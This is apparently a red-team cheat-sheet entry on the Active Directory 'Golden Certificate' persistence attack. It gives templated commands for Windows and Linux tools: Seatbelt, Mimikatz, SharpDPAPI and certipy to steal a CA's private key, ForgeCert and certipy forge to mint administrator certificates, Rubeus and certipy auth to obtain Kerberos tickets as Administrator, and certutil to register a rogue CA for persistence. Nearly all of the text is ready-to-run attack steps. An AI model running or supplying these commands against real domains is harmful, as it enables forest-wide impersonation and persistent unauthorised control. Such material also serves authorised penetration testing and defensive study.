---
technique: Golden Certificate
category: adcs-persistence
targets: Certificate Authority, Domain Admin
protocols: Kerberos, LDAP
remote_capable: true
tags: adcs persistence golden-certificate ca-private-key forge pkinit dpersist1
---

# Golden Certificate

A golden certificate is a certificate forged offline and signed with the CA's stolen private key. Analogous to a golden ticket, it allows impersonation of any principal in the forest without their password, survives password resets, and persists until the CA certificate itself is rotated. The CA private key is extracted via DPAPI from the CA server.

## Windows

### Seatbelt: extract CA cert remotely

#powershell #seatbelt #dpapi #ca-key

Extract DPAPI-protected CA certificate and private key from the CA server remotely with Seatbelt.

```powershell title:"Golden cert: extract CA cert remotely with Seatbelt"
.\Seatbelt.exe Certificates -computername="$ca_fqdn"
```
<!-- cheat
import domain_ip
import users
var ca_fqdn
-->

### certsrv.msc: backup CA locally

#windows #native #ca-backup

Back up the CA private key and certificate locally from the CA server console; requires local access to the CA.

```powershell title:"Golden cert: backup CA key via certsrv.msc (local CA access)"
certsrv.msc
```
<!-- cheat
import domain_ip
var ca_fqdn
-->

### Mimikatz: export CA cert locally

#powershell #mimikatz #dpapi #ca-key

Unlock CAPI/CNG and export all machine certificates including the CA private key from the CA server; requires local admin on the CA.

```powershell title:"Golden cert: export CA cert via Mimikatz crypto modules"
.\mimikatz.exe "crypto::capi" "crypto::cng" "crypto::certificates /export"
```
<!-- cheat
import domain_ip
-->

### SharpDPAPI: extract CA cert

#powershell #sharpdpapi #dpapi #ca-key

Extract machine certificate secrets via DPAPI with SharpDPAPI.

```powershell title:"Golden cert: extract CA cert via SharpDPAPI"
.\SharpDPAPI.exe certificates /machine
```
<!-- cheat
import domain_ip
-->

### openssl: convert CA cert to PFX

#powershell #openssl #dpapi #ca-key

Convert the PEM output to a usable PFX with openssl.

```powershell title:"Golden cert: convert extracted CA PEM to PFX"
openssl.exe pkcs12 -in "ca.pem" -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out "ca.pfx"
```
<!-- cheat
import domain_ip
-->

### ForgeCert: forge golden certificate

#powershell #forgecert #forge #san

Forge and sign a certificate with the stolen CA PFX to impersonate any user.

```powershell title:"Golden cert: forge cert with ForgeCert"
.\ForgeCert.exe --CaCertPath "$ca_pfx" --CaCertPassword "$ca_pfx_pass" --Subject "CN=$target_user" --SubjectAltName "administrator@$domain" --NewCertPath "administrator.pfx" --NewCertPassword "$new_pfx_pass"
```
<!-- cheat
import domain_ip
import users
var ca_pfx
var ca_pfx_pass
var target_user
var new_pfx_pass
-->

### Rubeus: request TGT with golden certificate

#powershell #rubeus #pkinit

Use the forged certificate with Rubeus to obtain a TGT.

```powershell title:"Golden cert: request TGT with forged administrator cert"
.\Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /password:"$new_pfx_pass" /domain:"$domain" /dc:"$dc_name" /show /nowrap
```
<!-- cheat
import domain_ip
var new_pfx_pass
var dc_name
-->

### certutil: register rogue CA (DPERSIST2)

#powershell #certutil #rogue-ca #ntauthcertificates

Add a self-signed rogue CA certificate to NTAuthCertificates so that forged certs signed by the rogue CA are trusted by the domain.

```powershell title:"DPERSIST2: publish rogue CA cert to NTAuthCertificates"
certutil.exe -dspublish -f "$rogue_ca_cert" NTAuthCA
```
<!-- cheat
import domain_ip
import users
var rogue_ca_cert
-->

### certutil: publish rogue root CA (DPERSIST2)

#powershell #certutil #rogue-ca #rootca

Publish the rogue CA certificate into the domain RootCA store so clients trust the issuing chain.

```powershell title:"DPERSIST2: publish rogue CA cert to RootCA store"
certutil.exe -dspublish -f "$rogue_ca_cert" RootCA
```
<!-- cheat
import domain_ip
import users
var rogue_ca_cert
-->

## Linux

### certipy ca: backup CA key

#certipy #dpapi #ca-backup

Remotely extract the DPAPI-protected CA private key and certificate from the CA server using certipy ca -backup.

```sh title:"Golden cert: backup CA private key remotely with certipy"
certipy ca -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -backup
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### certipy forge: forge golden certificate

#certipy #forge #san #offline

Forge a certificate offline using the stolen CA.pfx.

```sh title:"Golden cert: forge cert offline from stolen CA key"
certipy forge -ca-pfx $ca_pfx -upn administrator@$domain -subject "$target_subject" -out administrator.pfx
```
<!-- cheat
import domain_ip
import users
var ca_pfx
var target_subject
-->

### certipy auth: authenticate with golden certificate

#certipy #pkinit #auth

Authenticate with the forged certificate as the selected UPN.

```sh title:"Golden cert: authenticate with forged administrator cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
-->
